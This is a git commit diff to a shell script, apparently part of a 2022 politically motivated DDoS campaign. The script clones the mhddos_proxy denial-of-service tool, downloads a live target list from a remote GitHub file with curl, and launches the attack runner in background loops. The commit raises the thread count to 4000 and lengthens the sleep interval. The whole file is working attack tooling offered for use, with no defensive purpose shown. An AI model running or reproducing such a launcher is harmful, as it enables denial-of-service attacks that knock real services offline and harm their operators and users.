0003562fe4de350d048376195c1c654cc674fad3
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-07-03 04:20:09 +0300

    Update Start_L7_test.sh

--- Start_L7_test.sh
+++ Start_L7_test.sh
@@ -5,7 +5,7 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 
-threads="-t 3000"
+threads="-t 4000"
 rpc="--rpc 500"
 debug=""
 vpn="--vpn 1"
@@ -25,5 +25,5 @@ do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
             python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $vpn $debug&
       done
-sleep 9m
+sleep 14m
 done
